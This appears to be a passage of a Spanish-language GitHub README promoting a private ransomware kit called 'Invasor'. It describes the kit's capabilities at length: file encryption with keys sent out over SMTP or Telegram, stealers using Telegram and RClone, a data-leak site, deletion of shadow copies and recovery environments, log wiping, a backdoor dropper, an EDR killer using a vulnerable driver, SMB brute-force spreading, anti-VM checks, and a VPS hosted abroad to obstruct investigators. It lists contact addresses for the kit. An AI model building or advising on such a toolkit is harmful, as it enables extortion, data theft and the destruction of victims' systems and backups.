Cuenta con una funcionalidad de exclusión de archivos para evitar que el Ransomware encripte archivos y carpetas críticos del sistema que podrían dañar el sistema operativo. La lista puede ser modificada según las necesidades del atacante.

<img width="612" height="374" alt="encrypt" src="https://github.com/user-attachments/assets/d02da292-8166-402e-9f43-cf61b8aefd4a" />

Para mayor seguridad, la clave AES es cifrada utilizando ECC (Curva P-256), sin la clave ECC Privada el usuario final no podrá desencriptar los archivos. Son envíadas al atacante desde un servidor SMTP. La clave AES + ECC privada se sobrescriben tres veces con datos aleatorios y posteriormente con patrones de ceros y unos; finalmente, los archivos se trunca a 0 bytes antes de su eliminación. Este proceso de sobreescritura dificulta en extremo cualquier intento de recuperación forense.

<img width="1151" height="462" alt="SMTP" src="https://github.com/user-attachments/assets/c36d3bd1-9d7c-481f-9b91-605da78536f2" />

Si el servidor SMTP falla, envía la clave al canal de Telegram.

<img width="1364" height="646" alt="Telegram-Keys" src="https://github.com/user-attachments/assets/9a3f6579-7eba-4070-a92f-99815a8405a2" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/VPS SERVER:-093fb9.svg"> Invasor tiene contratado un servicio VPS seguro con ubicación en un país conflictivo. El hecho de que se utilice un VPS localizado en un país conflictivo le proporciona una cobertura jurídica; las agencias de inteligencia tendrán dificultades para requerir datos sobre el Ransomware a las autoridades de esa nación, obstruyendo la investigación.

El VPS se utiliza para:

1- Almacenaje de claves para el desencriptador.
<img width="1226" height="382" alt="vps-server" src="https://github.com/user-attachments/assets/775fb951-f0b7-43cc-a7c2-a6d07794468a" />

2- Gestión del Backdoor C2 con certificado SSL/TLS válidos disponible 24/7.
<img width="665" height="492" alt="Backdoor" src="https://github.com/user-attachments/assets/cd2c3948-eb1c-4146-bfa0-7f5a0d8dede9" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/RESCATE:-093fb9.svg"> Una vez finalizado el proceso de encriptación, Invasor genera un archivo interactivo denominado `Invasor-decrypt-files.html` en el escritorio del usuario, donde se detallan los pasos necesarios para obtener el desencriptador.

<img width="600" height="300" alt="Note-1" src="https://github.com/user-attachments/assets/290ec627-6a4a-4609-8e89-bf99abf9765a" />
<img width="600" height="300" alt="Note-2" src="https://github.com/user-attachments/assets/958a0350-fecb-4d89-8cdc-b3eca18e5866" />
<img width="600" height="300" alt="Note-3" src="https://github.com/user-attachments/assets/9f1804b6-ea52-40b8-a1bb-d831ac30aaaf" />
<img width="600" height="300" alt="Note-4" src="https://github.com/user-attachments/assets/7dbed0de-d7e2-4447-a32c-d1c491355d67" />
<img width="600" height="300" alt="Note-5" src="https://github.com/user-attachments/assets/3c109257-51da-4553-bd92-4de5edbcf0f5" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/DESENCRIPTACIÓN:-093fb9.svg"> Invasor cuenta con un Desencriptador GUI para recuperar los archivos encriptados, permite desencriptar por lote o por archivo individual.

<img width="478" height="716" alt="Decrypt-INVASOR" src="https://github.com/user-attachments/assets/14ba5475-de19-4b53-b5a7-068ae74ae90d" />

https://github.com/user-attachments/assets/f31e48cb-b8b1-40eb-aba2-bfbb7284d594

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/STEALERS:-093fb9.svg"> Antes de encriptar los archivos, hace una búsqueda recursivamente de archivos sensibles para luego ser enviados al atacante.

`Stealer 1- Telegram:` Utiliza Telegram como C&C dificulta a los mecanismos de seguridad que detecten la presencia del Stealer. La mayoría de los Ransomwares emplean esta técnica para presionar a la víctima y que pagué el rescate, de no hacerlo se filtra la información.

<img width="1265" height="588" alt="Stealer" src="https://github.com/user-attachments/assets/5dfa51e2-4025-4127-9f50-e9daeca66f10" />

Los archivos se comprimen en un .ZIP y se envían automáticamente. En caso de que el comprimido supere los 3.8GB, se envían por partes.

<img width="662" height="275" alt="Stealer_Diagrama" src="https://github.com/user-attachments/assets/8a3470dc-7c33-4c71-b233-9586ce986c66" />

`Stealer 2- RClone:` Utiliza RClone para sincronizar los archivos a la nube (API Drive) antes de encriptarlos, permite subir grandes volúmenes de archivos simultáneamente. RClone es un software legítimo, no es detectado como malware.

<img width="1029" height="542" alt="Stealer-2" src="https://github.com/user-attachments/assets/87ecc85a-9e56-46f6-80d0-2dfb73d1df81" />

Se le puede especificar que directorios y archivos debe exfiltrar.

<img width="771" height="455" alt="Stealer-3" src="https://github.com/user-attachments/assets/377abbb4-601c-4cfc-9ee9-070f9461a3bd" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/DATALEAK:-093fb9.svg">  Invasor cuenta con un proyecto web full personalizable listo para usarse en las filtraciones de datos.

https://github.com/user-attachments/assets/be25f8a7-6240-4fd2-a245-71ede1b3e075

<img width="665" height="340" alt="1" src="https://github.com/user-attachments/assets/3d4be421-f33b-49c1-89b1-2177c3fdc863" />
<img width="665" height="336" alt="2" src="https://github.com/user-attachments/assets/715c429b-b385-4dc3-8311-0cbe73b565cc" />
<img width="665" height="335" alt="3" src="https://github.com/user-attachments/assets/b662da0f-98b5-42f3-9279-46e7aafebacd" />
<img width="665" height="335" alt="4" src="https://github.com/user-attachments/assets/06b62963-5047-453c-b771-bfcf0cdde925" />
<img width="665" height="334" alt="5" src="https://github.com/user-attachments/assets/8b9c840b-ae7f-4bf9-92a4-d4d29cd3f4fa" />
<img width="665" height="336" alt="6" src="https://github.com/user-attachments/assets/c6ab49a3-fcd3-49f1-8ac0-1d820d0655da" />
<img width="665" height="333" alt="7" src="https://github.com/user-attachments/assets/70ee49a5-9bed-41f7-9c26-58e8bb64b174" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/PAYLOAD 1)-DISCOVERY-093fb9.svg"> Se diseño un herramienta de recolección de información del sistema que realiza un análisis comprehensivo del equipo infectado, recolectando datos como:

**1. INFORMACIÓN BÁSICA DEL SISTEMA:**
- Nombre de la máquina
- Nombre de usuario actual
- Dominio/usuario de Windows
- Versión del sistema operativo
- Arquitectura (32/64 bits)
- Directorio actual
- Directorio del sistema
- Número de procesadores
- Memoria RAM en uso
- Tiempo de actividad del sistema

**2. ANÁLISIS DE HARDWARE COMPLETO:**
- Procesador: Nombre, velocidad, núcleos, procesadores lógicos
- Memoria RAM: Total, disponible, porcentaje de uso
- Discos duros: Todos los discos, tamaño, espacio libre, sistema de archivos
- Fabricante y modelo del equipo
- Motherboard/Sistema completo

**3. INFORMACIÓN DE RED DETALLADA:**
- Hostname del equipo
- Todas las direcciones IP (IPv4 e IPv6)
- Interfaces de red: Nombre, tipo, estado, velocidad
- Direcciones MAC de cada interfaz
- Gateways configurados
- Servidores DNS
- Conexiones TCP activas: IPs locales/remotas, puertos, estado, PID del proceso

**4. USUARIOS Y GRUPOS:**
- Usuario actual: SID, tipo de autenticación
- Grupos del usuario: Todos los grupos de seguridad
- Usuarios locales: Todos los usuarios del sistema
- Información de dominio (si está unido)

**5. PROCESOS Y SERVICIOS:**
- Todos los procesos en ejecución (sin límite)
- PID, nombre, memoria usada, sesión
- Todos los servicios de Windows
- Nombre, estado, modo de inicio, ruta

**6. ACTIVE DIRECTORY (si aplica):**
- Detección de unión a dominio
- Nombre del dominio
- Rol del equipo en el dominio

**7. INFORMACIÓN DE SEGURIDAD:**
- Estado de UAC (User Account Control)
- Tipo de producto Windows
- Firewall instalado
- Políticas de seguridad

**8. REGISTRO DE WINDOWS:**
- Entradas de autoarranque (Run, RunOnce)
- Programas instalados (desde registro)
- Software detectado via WMI

**9. SMB SHARES (RECURSOS COMPARTIDOS):**
- Shares locales: ADMIN$, C$, IPC$, carpetas compartidas
- Tipos: Discos, impresoras, IPC, dispositivos
- Información de acceso y permisos

**10. SOFTWARE INSTALADO:**
- Programas detectados via WMI
- Nombre, versión, fabricante, fecha de instalación

El archivo `system_discovery_{DateTime.Now:yyyyMMdd_HHmmss}.html` es almacenado en memoria y sobrescrito con datos aleatorios luego de ser envíado al canal de Telegram.

<img width="1365" height="638" alt="System-Discovery-1" src="https://github.com/user-attachments/assets/c4cbca7a-06b5-419d-89b3-590e6f90ba21" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/PAYLOAD 2)-REMOVER-093fb9.svg"> Se implementó un módulo "Remover", especializado en la eliminación permanente de mecanismos de recuperación del sistema. 

1. `Elimina todas las Shadow Copies`: Borra todas las copias de seguridad del sistema usando varios métodos (VSS, WMI, CIM, VBScript), asegurándose de que no quede ninguna versión previa de archivos recuperable.
<img width="766" height="240" alt="1" src="https://github.com/user-attachments/assets/5a5ff288-906d-40fe-86ce-2bbf71fee865" />

<img width="634" height="363" alt="4" src="https://github.com/user-attachments/assets/9e7b9a39-aa7d-44f4-9f16-85b00b3644de" />

<img width="560" height="163" alt="5" src="https://github.com/user-attachments/assets/96e3d17d-b77d-40b0-9dda-6441a86a814d" />

2. `Desactiva y destruye Windows Recovery Environment (WinRE)`: Deshabilita WinRE, borra sus archivos (winre.wim), elimina carpetas asociadas y hasta intenta borrar particiones de recuperación para impedir restauración del sistema. Se eleva automáticamente con UAC y habilita SeDebugPrivilege para manipular procesos del sistema.

<img width="571" height="96" alt="3" src="https://github.com/user-attachments/assets/0a864cf8-384d-4274-8193-309ba93be6b0" />

3. `Modificar el BCD para impedir recuperaciones`: Edita la configuración de arranque (BCD) para desactivar recuperación automática y evitar que Windows muestre opciones de reparación tras fallas.

<img width="584" height="400" alt="2" src="https://github.com/user-attachments/assets/68721f32-95e5-4e14-b757-e86fa026d74c" />

4. `Borra rastros forenses`: Elimina registros de eventos (System, Security, Application, PowerShell) y borra archivos Prefetch, dificultando análisis forense posterior. Configura EventLog para que falle permanentemente.

<img width="788" height="181" alt="6" src="https://github.com/user-attachments/assets/9a651ad3-e738-4f3d-b10a-aa6b309edb98" />

<img width="619" height="557" alt="7" src="https://github.com/user-attachments/assets/fc0043f2-0472-4249-b503-83fa1945fd8f" />

5. `Ofuscación de comandos y múltiples métodos`: Esconde los comandos (hex, concatenación, scripts codificados Base64) y usa varias rutas para cada acción (cmd, PowerShell, COM, WMI), garantizando que se ejecute aunque falle un método. El código emplea técnicas de polimorfismo.

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/PAYLOAD 3)-PROCESS KILLER-093fb9.svg"> Se implementaron dos módulos en uno "ProcessKiller + ProcessKillerExtensions" encargados de matar procesos del sistema para optimizar la disponibilidad de memoria y capacidad de procesamiento para el módulo de encriptación. De esta manera, el Ransomware obtiene los siguientes beneficios en su proceso de ejecución:

`ACELERA EL CIFRADO EXPONENCIALMENTE` - **Libera recursos del sistema:**
- Libera RAM: Al matar procesos, más memoria para cifrado
- Libera CPU: Procesos como Chrome, Photoshop usan mucha CPU
- Libera disco: Procesos que escriben/leen disco

`PREVIENE INTERRUPCIÓN` - **Elimina amenazas:**
- Task Manager: Usuario no puede ver/kill proceso ransomware
- Process Explorer: Herramientas de sysadmin
- RDP/Session managers: Evita que admin remoto intervenga
- Cloud sync: Dropbox, Google Drive, OneDrive (evita sync de archivos sanos)

`EVITA RECUPERACIÓN` - **Bloquea software de recuperación:**
- Shadow Copy: Mata vssadmin.exe para borrar snapshots
- System Restore: Impide creación de puntos de restauración
- Backup services: Servicios de backup de Windows

ProcessKiller incorporá una WhiteList con aquellos procesos que considera críticos del sistema. Si NO está en la whitelist ⇒ se intenta matar.

<img width="405" height="400" alt="WhiteList" src="https://github.com/user-attachments/assets/3757930a-954b-47fb-9a86-b127dcb87149" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/PAYLOAD 4)-PERSISTENCIA-093fb9.svg"> Invasor despliega técnicas de persistencia para garantizar el control remoto en equipos infectados.

`Backdoor`: Módulo **Backdoor[svchost.dll]** - Dropper encargado de descargar y ejecutar <a href="https://github.com/R3LI4NT/XilentDoor">XilentDoor</a> en el equipo del usuario, proporcionando movimiento lateral. 

Utiliza métodos de descarga alternativos como HttpClient, WebClient y Certutil.exe por si alguno falla. Emplea cuatro métodos de extracción para descomprimir el zip (Backdoor) que son System.IO.Compression (Nativo de .NET), Powershell, Shell COM (Windows Shell) y 7-Zip por si alguno falla. El Backdoor se auto-ejecuta y luego ejecuta múltiples intentos de eliminación para borrar evidencias.

Ciclo de vida: 1. Descarga **→** 2. Extracción **→** 3. Ejecución **→** 4. Eliminación

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/PAYLOAD 5)-EVASIÓN-093fb9.svg"> Emplea la técnica **BYOVD** (Bring Your Own Vulnerable Driver) para desplegar tácticas de EDR Killer, permitiendo la finalización de procesos de antivirus que podrían impedir la ejecución de Invasor.

<img width="1364" height="721" alt="530585684-4de93ecc-7838-4602-813d-4bbb2d52ca42" src="https://github.com/user-attachments/assets/a62a6a0a-826f-4c07-8df0-938ccf6eeba3" />

Por defecto mata 180 procesos, estos pueden ser modificables según las necesidades. El proceso de ejecución de `EDRKiller.dll` es simple: descarga **7z.exe + updateWindows.zip** en la ruta temporal del usuario; a continuación, utiliza **7-Zip** en modo línea de comandos para descomprimir el archivo, el cual contiene el controlador vulnerable que será instalado. Una vez cargado en el sistema, el módulo lanza múltiples hilos para finalizar de forma concurrente todos los procesos definidos en la lista. Una vez que haya cumplido el ciclo, elimina las evidencias.

<img width="1099" height="611" alt="edr_killer" src="https://github.com/user-attachments/assets/75232520-f79c-4eb0-83cd-3349a6c2bd39" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/PAYLOAD 6)-MOVIMIENTO LATERAL-093fb9.svg"> Se desarrollo un módulo llamado `SMBSpreader` encargado de infectar con el Ransomware a otros equipos en la red a través del protocolo SMB.

`FASE 0: PREPARACIÓN`
- Descarga 7zr.exe, el loader.zip + PAExec.exe.

`FASE 1: ESCANEO DE RED`
- Descubre hosts activo en la red local (ping sweep).
- Escaneo multi-hilo (50 hilos concurrentes).

`FASE 2: DETECCIÓN SMB`
- Prueba puerto 445 en hosts activos.
- Identifica equipos vulnerables con SMB habilitado.
- Filtra solo sistemas accesibles.

`FASE 3: ATAQUE Y PROPAGACIÓN`
- Enumeración de shares - Busca carpetas compartidas.

**Ataque en dos fases:**
- Acceso sin credenciales: Prueba shares abiertos (ADMIN$, C$, etc.).
- Brute force: Prueba combinaciones usuario/contraseña débiles.

**Despliegue con PAExec:**
- Copia el payload al share accesible.
- Ejecuta remotamente usando PAExec.

`FASE 4: LIMPIEZA ANTIFORENSE`
- Sobrescritura DoD 5220.22-M (3 pasadas de datos aleatorios).
- Eliminación segura de archivos temporales.
- Limpieza de rastros en sistema temp.

<img width="1304" height="642" alt="SMBSpreader-1" src="https://github.com/user-attachments/assets/a43cd82e-1102-479d-a52d-5487e13482de" />
<img width="1199" height="680" alt="SMBSpreader-2" src="https://github.com/user-attachments/assets/9ac2bd94-8ed3-4d89-9659-a4477685a278" />
<img width="1258" height="692" alt="SMBSpreader-3" src="https://github.com/user-attachments/assets/080b996a-69e6-4c38-bb01-d08a93202c56" />
<img width="420" height="152" alt="SMBSpreader-4" src="https://github.com/user-attachments/assets/81308cf7-e0f8-45c5-8263-6f595a7cbf96" />

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/AntiVM:-093fb9.svg"> Antes de comenzar la encriptación, verifica si se ejecuta en máquina virtual y se auto-termina si detecta entorno virtual. 

https://github.com/user-attachments/assets/d275df1b-c9ff-4815-8bb0-96a72c17016c

<h1 align="center"></h1>

<img src="https://img.shields.io/badge/E-BOOK:-093fb9.svg"> Se está trabajando en un E-Book para documentar y organizar el Ransomware. 

<img width="460" height="688" alt="ebook-design-2" src="https://github.com/user-attachments/assets/78b5fb27-86e6-4bd8-97b2-693c9e963cca" />

<h1 align="center"></h1>

Contacto:

<img src="https://img.shields.io/badge/r3li4nt.contact@keemail.me-D14836?style=for-the-badge&logo=gmail&logoColor=white" />

<img src="https://img.shields.io/badge/invasor.support@onionmail.org-0239A4?style=for-the-badge&logo=gmail&logoColor=white" />

</br>
</br>

> [!NOTE]
> Invasor esta programado en C#, sin utilizar código de otras muestras conocidas, kits de construcción o fragmentos reutilizados. Por lo tanto, su código fuente es único y privado. Cuenta con una versión inofensiva diseñada para Simulacros de Ransomware, full personalizable sin comprometer la infraestructura.

> Fecha de creación: Principio de Noviembre 2025
